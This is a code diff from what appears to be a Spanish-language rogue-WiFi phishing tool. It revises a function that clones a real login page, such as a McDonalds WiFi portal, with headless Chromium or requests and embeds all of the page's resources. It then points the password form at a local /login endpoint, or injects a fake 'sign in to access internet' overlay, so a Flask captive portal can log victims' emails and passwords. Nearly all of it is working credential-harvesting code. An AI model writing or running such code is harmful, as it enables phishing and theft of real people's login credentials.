@@ -168,20 +168,20 @@ _PORTAL_HTML_SUCCESS = """<!DOCTYPE html>
 def clone_login_page(url: str, log_fn=None) -> str:
     """
     Descarga la página de login indicada por 'url' y devuelve un HTML
-    autocontenido con todos los recursos (CSS, imágenes, fuentes, JS)
-    incrustados como data-URI en base64.
+    autocontenido con todos los recursos (CSS, imágenes, fuentes) incrustados
+    como data-URI en base64.
 
-    El HTML resultante se modifica para que:
-      - El primer <form> con campos de password apunte a POST /login
-      - Los campos del form se renombren a "email" y "password"
-        (para que Flask los capture igual que en la plantilla Google)
+    Estrategia:
+      1. chromium --headless --dump-dom  → HTML renderizado con JS ejecutado
+      2. Fallback: requests con headers de navegador real
+      Luego: todos los recursos externos → data-URI base64 (inline)
+      El primer <form> con password se redirige a POST /login
 
     Args:
-        url: URL de una página de login real (p.ej. login de McDonalds WiFi)
-        log_fn: función opcional para recibir mensajes de progreso
-
+        url:    URL de la página de login real
+        log_fn: función opcional para mensajes de progreso
     Returns:
-        str con el HTML autocontenido, o "" si falla
+        str con HTML autocontenido, o "" si falla
     """
     def _log(msg):
         if log_fn:
@@ -191,298 +191,215 @@ def clone_login_page(url: str, log_fn=None) -> str:
         import requests
         from bs4 import BeautifulSoup
     except ImportError:
-        _log("[!] Faltan dependencias: pip3 install requests beautifulsoup4 --break-system-packages")
+        _log("[!] pip3 install requests beautifulsoup4 --break-system-packages")
         return ""
 
-    import re as _re
+    import re, base64, mimetypes, shutil, subprocess, tempfile
+    from urllib.parse import urljoin, urlparse
 
-    headers = {
+    HEADERS = {
         "User-Agent": (
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
             "AppleWebKit/537.36 (KHTML, like Gecko) "
             "Chrome/124.0.0.0 Safari/537.36"
         ),
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-        "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "es-ES,es;q=0.9,en;q=0.7",
         "Accept-Encoding": "gzip, deflate, br",
         "Connection": "keep-alive",
         "Upgrade-Insecure-Requests": "1",
-        "Sec-Fetch-Dest": "document",
-        "Sec-Fetch-Mode": "navigate",
-        "Sec-Fetch-Site": "none",
-        "Sec-Fetch-User": "?1",
-        "Cache-Control": "max-age=0",
     }
 
     import urllib3
     urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
     html_text = ""
-    final_url = url
+    final_url  = url
 
-    # ── 1. Intentar con requests (headers reales + cookies de sesión) ─
-    _log(f"[*] Iniciando clonación de: {url}")
-    try:
-        session = requests.Session()
-        session.headers.update(headers)
-        session.verify = False
-        # Visitar la home primero para obtener cookies de sesión
-        from urllib.parse import urlparse as _up
-        parsed = _up(url)
-        home_url = f"{parsed.scheme}://{parsed.netloc}/"
+    # ── 1. Chromium headless --dump-dom (renderiza JS, sin dependencias extra) ──
+    chromium_bin = (shutil.which("chromium") or
+                    shutil.which("chromium-browser") or
+                    shutil.which("google-chrome") or
+                    shutil.which("google-chrome-stable"))
+    if chromium_bin:
+        _log(f"[*] Usando {chromium_bin} --headless para renderizar {url}")
         try:
-            session.get(home_url, timeout=10, allow_redirects=True)
-        except Exception:
-            pass
-        _log(f"[*] Descargando página: {url}")
-        resp = session.get(url, timeout=20, allow_redirects=True)
-        resp.raise_for_status()
-        final_url = resp.url
-        encoding = resp.encoding or "utf-8"
-        try:
-            html_text = resp.content.decode(encoding, errors="replace")
-        except Exception:
-            html_text = resp.text
-        _log(f"[*] Descargado con requests ({len(html_text)} bytes). URL final: {final_url}")
-        # Detectar si el sitio bloquea recursos (CSS/JS con 403) → necesita Playwright
-        _needs_playwright = False
-        try:
-            from bs4 import BeautifulSoup as _BS4_check
-            _soup_check = _BS4_check(html_text, "html.parser")
-            for _link in _soup_check.find_all("link", rel=lambda v: v and "stylesheet" in v):
-                _href = _link.get("href", "")
-                if _href and not _href.startswith("data:"):
-                    from urllib.parse import urljoin as _urljoin_check
-                    _abs = _urljoin_check(final_url, _href)
-                    try:
-                        import requests as _req_check
-                        _r = _req_check.head(_abs, headers=headers, timeout=5, verify=False,
-                                             allow_redirects=True)
-                        if _r.status_code in (403, 401, 429, 503):
-                            _log(f"[*] CSS bloqueado ({_r.status_code}): activando Playwright")
-                            _needs_playwright = True
-                            break
-                    except Exception:
-                        pass
-        except Exception:
-            pass
-    except Exception as e:
-        _log(f"[!] requests falló: {e}")
-        html_text = ""
-        _needs_playwright = False
+            result = subprocess.run(
+                [
+                    chromium_bin,
+                    "--headless=new",
+                    "--no-sandbox",
+                    "--disable-setuid-sandbox",
+                    "--disable-gpu",
+                    "--disable-dev-shm-usage",
+                    "--disable-blink-features=AutomationControlled",
+                    "--user-agent=" + HEADERS["User-Agent"],
+                    "--timeout=20000",
+                    "--dump-dom",
+                    url,
+                ],
+                capture_output=True,
+                text=True,
+                timeout=30,
+            )
+            if result.returncode == 0 and len(result.stdout) > 500:
+                html_text = result.stdout
+                final_url = url
+                _log(f"[*] Chromium headless OK ({len(html_text)} bytes)")
+            else:
+                _log(f"[!] Chromium headless devolvió poco contenido ({len(result.stdout)} bytes)")
+        except subprocess.TimeoutExpired:
+            _log("[!] Chromium headless tardó demasiado, usando requests")
+        except Exception as e:
+            _log(f"[!] Chromium headless falló: {e}")
+    else:
+        _log("[*] chromium no encontrado, usando requests directamente")
 
-    # ── 2. Fallback: Playwright headless via Node.js (para sitios con JS) ─
-    if not html_text or len(html_text) < 500 or _needs_playwright:
-        _log("[*] Intentando con Playwright Node.js headless (puede tardar ~15s)...")
+    # ── 2. Fallback: requests con cookies de sesión ─────────────────────────────
+    if not html_text or len(html_text) < 500:
+        _log(f"[*] Descargando con requests: {url}")
         try:
-            import subprocess as _sp, tempfile as _tf, json as _json, shutil as _sh
-            # Verificar que npx/playwright están disponibles
-            npx_path = _sh.which("npx")
-            if not npx_path:
-                raise RuntimeError("npx no encontrado")
-            # Script Node.js inline que usa el playwright instalado
-            js_script = f"""
-const {{ chromium }} = require('playwright');
-(async () => {{
-    // Try to find system Chromium if playwright's own binary is missing
-    const fs = require('fs');
-    const candidates = ['/usr/bin/chromium', '/usr/bin/chromium-browser',
-                        '/usr/bin/google-chrome', '/usr/bin/google-chrome-stable'];
-    let executablePath = undefined;
-    for (const c of candidates) {{ if (fs.existsSync(c)) {{ executablePath = c; break; }} }}
-    const browser = await chromium.launch({{
-        headless: true,
-        executablePath: executablePath,
-        args: ['--no-sandbox', '--disable-setuid-sandbox',
-               '--disable-blink-features=AutomationControlled']
-    }});
-    const ctx = await browser.newContext({{
-        userAgent: '{headers["User-Agent"]}',
-        locale: 'es-ES',
-        ignoreHTTPSErrors: true
-    }});
-    const page = await ctx.newPage();
-    try {{
-        await page.goto({_json.dumps(url)}, {{ waitUntil: 'networkidle', timeout: 30000 }});
-        const result = {{ url: page.url(), html: await page.content() }};
-        process.stdout.write(JSON.stringify(result));
-    }} catch(e) {{
-        process.stdout.write(JSON.stringify({{ error: e.message }}));
-    }} finally {{
-        await browser.close();
-    }}
-}})();
-"""
-            # Escribir script a fichero temporal
-            with _tf.NamedTemporaryFile(mode='w', suffix='.js',
-                                        delete=False, prefix='/tmp/wt_pw_') as tf:
-                tf.write(js_script)
-                tf_path = tf.name
+            sess = requests.Session()
+            sess.headers.update(HEADERS)
+            sess.verify = False
+            # Cargar la home primero para obtener cookies de sesión
+            parsed = urlparse(url)
+            home = f"{parsed.scheme}://{parsed.netloc}/"
             try:
-                result = _sp.run(
-                    ['node', tf_path],
-                    capture_output=True, text=True, timeout=40
-                )
-                if result.returncode == 0 and result.stdout:
-                    data = _json.loads(result.stdout)
-                    if 'error' in data:
-                        raise RuntimeError(data['error'])
-                    html_text = data.get('html', '')
-                    final_url = data.get('url', url)
-                    _log(f"[*] Playwright Node.js OK ({len(html_text)} bytes). URL: {final_url}")
-                else:
-                    raise RuntimeError(result.stderr[:200] if result.stderr else 'sin output')
-            finally:
-                try: os.unlink(tf_path)
-                except Exception: pass
-        except Exception as e2:
-            _log(f"[!] Playwright Node.js falló: {e2}")
-            if not html_text:
-                return ""
+                sess.get(home, timeout=10, allow_redirects=True)
+            except Exception:
+                pass
+            resp = sess.get(url, timeout=20, allow_redirects=True)
+            resp.raise_for_status()
+            final_url = resp.url
+            html_text = resp.content.decode(resp.encoding or "utf-8", errors="replace")
+            _log(f"[*] requests OK ({len(html_text)} bytes). URL final: {final_url}")
+        except Exception as e:
+            _log(f"[!] requests falló: {e}")
+            return ""
 
     soup = BeautifulSoup(html_text, "html.parser")
 
-    # Sesión para descargar recursos (disponible incluso si usó Playwright)
-    _res_session = requests.Session()
-    _res_session.headers.update(headers)
-    _res_session.verify = False
+    # ── Sesión para descargar recursos ──────────────────────────────────────────
+    res_sess = requests.Session()
+    res_sess.headers.update(HEADERS)
+    res_sess.verify = False
 
-    # ── 3. Función auxiliar: descargar recurso → data URI ────────
-    def _resource_to_data_uri(href, base_url):
-        abs_url = urljoin(base_url, href)
-        # Sólo recursos HTTP/HTTPS
-        scheme = urlparse(abs_url).scheme
-        if scheme not in ("http", "https"):
+    def to_data_uri(href, base):
+        """Descarga un recurso y lo devuelve como data-URI base64."""
+        abs_url = urljoin(base, href)
+        if urlparse(abs_url).scheme not in ("http", "https"):
             return None
         try:
-            r = _res_session.get(abs_url, timeout=10, allow_redirects=True)
+            r = res_sess.get(abs_url, timeout=10, allow_redirects=True)
             if r.status_code != 200:
                 return None
-            content_type = r.headers.get("Content-Type", "").split(";")[0].strip()
-            if not content_type:
-                # Adivinar por extensión
+            ct = r.headers.get("Content-Type", "").split(";")[0].strip()
+            if not ct:
                 ext = os.path.splitext(urlparse(abs_url).path)[1].lower()
-                content_type = mimetypes.types_map.get(ext, "application/octet-stream")
-            b64 = base64.b64encode(r.content).decode("ascii")
-            return f"data:{content_type};base64,{b64}"
+                ct = mimetypes.types_map.get(ext, "application/octet-stream")
+            return f"data:{ct};base64,{base64.b64encode(r.content).decode()}"
         except Exception:
             return None
 
-    # ── 4. Inlinar CSS externos ──────────────────────────────────
+    def inline_css_urls(css_text, base):
+        """Reemplaza url(...) dentro de CSS con data-URIs."""
+        def _repl(m):
+            raw = m.group(1).strip("'\" )
+            if raw.startswith("data:"):
+                return m.group(0)
+            d = to_data_uri(raw, base)
+            return f"url({d})" if d else m.group(0)
+        return re.sub(r"url\(([^)]+)\)", _repl, css_text)
+
+    # ── Inlinar hojas de estilo externas ────────────────────────────────────────
     for tag in soup.find_all("link", rel=lambda v: v and "stylesheet" in v):
         href = tag.get("href", "")
         if not href or href.startswith("data:"):
             continue
         _log(f"  [css] {href[:80]}")
-        data_uri = _resource_to_data_uri(href, final_url)
-        if data_uri:
-            new_style = soup.new_tag("style")
-            # Descargar el CSS y resolver sus url() también
-            try:
-                abs_url = urljoin(final_url, href)
-                css_resp = _res_session.get(abs_url, timeout=10)
-                css_text = css_resp.text
-                # Reemplazar url(...) dentro del CSS con data URIs
-                import re as _re
-                def _replace_css_url(m):
-                    raw = m.group(1).strip("'\" ")
-                    if raw.startswith("data:"):
-                        return m.group(0)
-                    d = _resource_to_data_uri(raw, abs_url)
-                    return f"url({d})" if d else m.group(0)
-                css_text = _re.sub(r"url\(([^)]+)\)", _replace_css_url, css_text)
-                new_style.string = css_text
-            except Exception:
-                new_style.string = f"/* could not inline {href} */"
-            tag.replace_with(new_style)
+        abs_url = urljoin(final_url, href)
+        try:
+            r = res_sess.get(abs_url, timeout=10)
+            if r.status_code == 200:
+                css = inline_css_urls(r.text, abs_url)
+                style = soup.new_tag("style")
+                style.string = css
+                tag.replace_with(style)
+            else:
+                _log(f"  [!] CSS {r.status_code}: {href[:60]}")
+                tag.decompose()
+        except Exception as e:
+            _log(f"  [!] CSS error: {e}")
+            tag.decompose()
 
-    # ── 5. Inlinar imágenes (<img src=>) ─────────────────────────
+    # ── Inlinar imágenes ─────────────────────────────────────────────────────────
     for tag in soup.find_all("img"):
         src = tag.get("src", "")
-        if not src or src.startswith("data:"):
-            continue
-        _log(f"  [img] {src[:80]}")
-        data_uri = _resource_to_data_uri(src, final_url)
-        if data_uri:
-            tag["src"] = data_uri
+        if src and not src.startswith("data:"):
+            d = to_data_uri(src, final_url)
+            if d:
+                tag["src"] = d
 
-    # ── 5. Inlinar fuentes y otros recursos en <style> inline ────
-    import re as _re
-    for style_tag in soup.find_all("style"):
-        if style_tag.string:
-            def _replace_css_url2(m):
-                raw = m.group(1).strip("'\" ")
-                if raw.startswith("data:"):
-                    return m.group(0)
-                d = _resource_to_data_uri(raw, final_url)
-                return f"url({d})" if d else m.group(0)
-            style_tag.string = _re.sub(r"url\(([^)]+)\)", _replace_css_url2, style_tag.string)
-
-    # ── 6. Inlinar atributos background/style inline ─────────────
+    # ── Inlinar url() en <style> inline y atributos style ───────────────────────
+    for tag in soup.find_all("style"):
+        if tag.string:
+            tag.string = inline_css_urls(tag.string, final_url)
     for tag in soup.find_all(style=True):
-        style_val = tag["style"]
-        def _replace_inline(m):
-            raw = m.group(1).strip("'\" ")
-            if raw.startswith("data:"):
-                return m.group(0)
-            d = _resource_to_data_uri(raw, final_url)
-            return f"url({d})" if d else m.group(0)
-        tag["style"] = _re.sub(r"url\(([^)]+)\)", _replace_inline, style_val)
+        tag["style"] = inline_css_urls(tag["style"], final_url)
 
-    # ── 7. Adaptar el formulario para capturar credenciales ───────
-    # Buscar el form que tenga input[type=password]
-    target_form = None
-    for form in soup.find_all("form"):
-        if form.find("input", {"type": "password"}):
-            target_form = form
-            break
-
+    # ── Adaptar formulario para capturar credenciales ────────────────────────────
+    target_form = next(
+        (f for f in soup.find_all("form") if f.find("input", {"type": "password"})),
+        None
+    )
     if target_form:
         target_form["method"] = "POST"
         target_form["action"] = "/login"
-        # Renombrar el primer campo de texto/email → "email"
-        email_input = (target_form.find("input", {"type": "email"})
-                       or target_form.find("input", {"type": "text"})
-                       or target_form.find("input", {"type": "tel"}))
+        email_input = (
+            target_form.find("input", {"type": "email"}) or
+            target_form.find("input", {"type": "text"}) or
+            target_form.find("input", {"type": "tel"})
+        )
         if email_input:
             email_input["name"] = "email"
-        # Renombrar el campo password → "password"
-        pwd_input = target_form.find("input", {"type": "password"})
-        if pwd_input:
-            pwd_input["name"] = "password"
-        _log("[+] Formulario adaptado → POST /login (email, password)")
+        pwd = target_form.find("input", {"type": "password"})
+        if pwd:
+            pwd["name"] = "password"
+        _log("[+] Formulario adaptado → POST /login")
     else:
-        # No encontró form con password: inyectar uno encima del body
-        _log("[!] No se encontró form con password; inyectando overlay de login")
-        overlay_html = """
+        _log("[!] Sin form con password: inyectando overlay")
+        overlay = """
 <div id="wt-overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;
-  background:rgba(0,0,0,0.7);z-index:99999;display:flex;align-items:center;
-  justify-content:center;">
-  <div style="background:white;border-radius:8px;padding:40px;width:340px;text-align:center;
-    box-shadow:0 4px 24px rgba(0,0,0,0.5);">
-    <h2 style="margin-bottom:16px;font-size:20px;color:#333;">Inicia sesión para continuar</h2>
+  background:rgba(0,0,0,0.72);z-index:99999;display:flex;align-items:center;
+  justify-content:center;font-family:sans-serif;">
+  <div style="background:#fff;border-radius:10px;padding:40px 36px;width:340px;
+    text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.4);">
+    <h2 style="margin:0 0 6px;font-size:22px;color:#202124;font-weight:500;">
+      Inicia sesión para continuar</h2>
+    <p style="margin:0 0 24px;font-size:13px;color:#5f6368;">
+      Necesitas identificarte para acceder a internet</p>
     <form method="POST" action="/login">
       <input name="email" type="email" placeholder="Correo electrónico" required
-        style="width:100%;padding:10px;margin-bottom:12px;border:1px solid #ccc;
-               border-radius:4px;font-size:14px;">
+        style="display:block;width:100%;padding:11px 12px;margin-bottom:12px;
+               border:1px solid #dadce0;border-radius:4px;font-size:14px;box-sizing:border-box">
       <input name="password" type="password" placeholder="Contraseña" required
-        style="width:100%;padding:10px;margin-bottom:16px;border:1px solid #ccc;
-               border-radius:4px;font-size:14px;">
+        style="display:block;width:100%;padding:11px 12px;margin-bottom:20px;
+               border:1px solid #dadce0;border-radius:4px;font-size:14px;box-sizing:border-box">
       <button type="submit"
-        style="width:100%;background:#1a73e8;color:white;border:none;border-radius:4px;
-               padding:11px;font-size:15px;cursor:pointer;">Acceder</button>
+        style="width:100%;background:#1a73e8;color:#fff;border:none;border-radius:4px;
+               padding:11px;font-size:15px;font-weight:500;cursor:pointer;">
+        Acceder</button>
     </form>
   </div>
 </div>"""
         body = soup.find("body")
         if body:
-            body.insert(0, BeautifulSoup(overlay_html, "html.parser"))
+            body.insert(0, BeautifulSoup(overlay, "html.parser"))
 
-    # ── 8. Eliminar scripts externos (pueden romper el portal) ────
+    # ── Eliminar scripts externos y <base> tags ──────────────────────────────────
     for tag in soup.find_all("script", src=True):
         tag.decompose()
-
-    # ── 9. Quitar <base> tags que redirigirían recursos externos ──
     for tag in soup.find_all("base"):
         tag.decompose()
 
@@ -490,7 +407,6 @@ const {{ chromium }} = require('playwright');
     return str(soup)
 
 
-# ── Flask app ────────────────────────────────────────────────────
 
 def _build_flask_app(gateway_ip, template_type, creds_log,
                      custom_html=None,
